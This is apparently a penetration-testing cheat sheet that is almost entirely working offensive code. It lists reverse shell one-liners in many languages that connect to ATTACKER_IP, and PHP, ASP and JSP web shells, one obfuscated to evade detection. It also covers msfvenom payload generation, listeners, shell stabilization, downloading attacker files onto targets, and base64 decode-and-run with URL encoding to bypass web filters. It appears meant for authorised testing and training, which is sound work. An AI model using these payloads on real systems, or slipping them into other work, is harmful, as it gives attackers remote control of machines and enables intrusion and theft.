# Shells and Payloads

## Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

### Netcat

```bash
# Traditional
nc -e /bin/sh ATTACKER_IP PORT

# OpenBSD (no -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# ncat with SSL
ncat --ssl ATTACKER_IP PORT -e /bin/sh
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Shorter
python3 -c 'import os;os.system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"")'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (generate with): echo -n 'IEX(...)' | iconv -t UTF-16LE | base64 -w0
powershell -e BASE64_ENCODED_PAYLOAD
```

### Socat

```bash
# Attacker (listener with TTY)
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

# Encrypted (generate cert: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt && cat shell.key shell.crt > shell.pem)
# Attacker
socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
# Target
socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Generators

- [revshells.com](https://www.revshells.com/) -- interactive reverse shell generator
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>

<?php echo shell_exec($_REQUEST['cmd']); ?>

<?php passthru($_POST['cmd']); ?>

# Evade basic detection
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
```

### ASP/ASPX

```
# ASP
<% eval request("cmd") %>

# ASPX
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Known Web Shell Locations (Kali)

| Shell | Path |
|---|---|
| Laudanum (PHP/ASP/JSP) | `/usr/share/webshells/laudanum/` |
| Antak (ASPX) | `/usr/share/nishang/Antak-WebShell/` |
| p0wny-shell | [github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell) |

---

## Shell Stabilization

### Python PTY Upgrade

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Set terminal raw mode on attacker machine
stty raw -echo; fg

# Step 4: Set terminal type in the shell
export TERM=xterm
export SHELL=bash

# Step 5: Fix terminal size
stty rows ROWS cols COLS
# (get values from attacker terminal: stty -a)
```

### Script Method

```bash
script /dev/null -c bash
# Then Ctrl+Z, stty raw -echo; fg
```

### Rlwrap (for Windows shells)

```bash
# Wraps netcat with readline (arrow keys, history)
rlwrap nc -lvnp PORT
```

### Other Spawn Methods

```bash
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'
find / -name anything -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

---

## Listeners

### Netcat

```bash
nc -lvnp PORT

# Save output to file
nc -lvnp PORT | tee session.log
```

### Pwncat

```bash
# Listener mode
pwncat-cs -lp PORT

# Connect to bind shell
pwncat-cs CONNECT://TARGET_IP:PORT

# Features: auto-upgrade, file upload/download, persist, privesc enumeration
```

### Metasploit multi/handler

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp   # or windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT PORT
run
```

---

## MSFVenom Payloads

### Linux

```bash
# Stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

# Staged (smaller, requires handler)
msfvenom -p linux/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

### Windows

```bash
# Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

### Web Payloads

```bash
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

# PHP
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > shell.php
```

### macOS

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
```

---

## File Transfer Methods

### Attacker-Side Servers

```bash
# Python HTTP server
python3 -m http.server 8000

# PHP server
php -S 0.0.0.0:8000

# Ruby server
ruby -run -ehttpd . -p8000

# Netcat file transfer (send)
nc -lvnp PORT < file_to_send
```

### Linux Target (Download)

```bash
# wget
wget http://ATTACKER_IP:PORT/file -O /tmp/file

# curl
curl http://ATTACKER_IP:PORT/file -o /tmp/file

# Bash /dev/tcp (no tools needed)
cat < /dev/tcp/ATTACKER_IP/PORT > /tmp/file

# SCP
scp user@ATTACKER_IP:/path/to/file /tmp/file
```

### Windows Target (Download)

```powershell
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER_IP:PORT/file -OutFile C:\Temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:PORT/file','C:\Temp\file')

# certutil
certutil -urlcache -split -f http://ATTACKER_IP:PORT/file C:\Temp\file

# bitsadmin
bitsadmin /transfer job http://ATTACKER_IP:PORT/file C:\Temp\file

# SMB share (from attacker: impacket-smbserver share /path -smb2support)
copy \\ATTACKER_IP\share\file C:\Temp\file
```

---

## Payload Encoding

### Base64

```bash
# Encode
echo -n 'payload' | base64

# Decode and execute (Linux)
echo BASE64_STRING | base64 -d | bash

# PowerShell (UTF-16LE required)
echo -n 'IEX(command)' | iconv -t UTF-16LE | base64 -w0
powershell -EncodedCommand BASE64_STRING
```

### URL Encoding

```bash
# Python one-liner
python3 -c "import urllib.parse; print(urllib.parse.quote('payload string'))"

# Double URL encoding for WAF bypass
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('payload')))"
```

### Hex Encoding

```bash
# Encode
echo -n 'payload' | xxd -p

# Decode
echo '7061796c6f6164' | xxd -r -p
```

---

## Resources

- [revshells.com](https://www.revshells.com/)
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [GTFOBins](https://gtfobins.github.io/) -- Unix binaries for shell escape / file transfer
- [LOLBAS](https://lolbas-project.github.io/) -- Windows binaries for living off the land
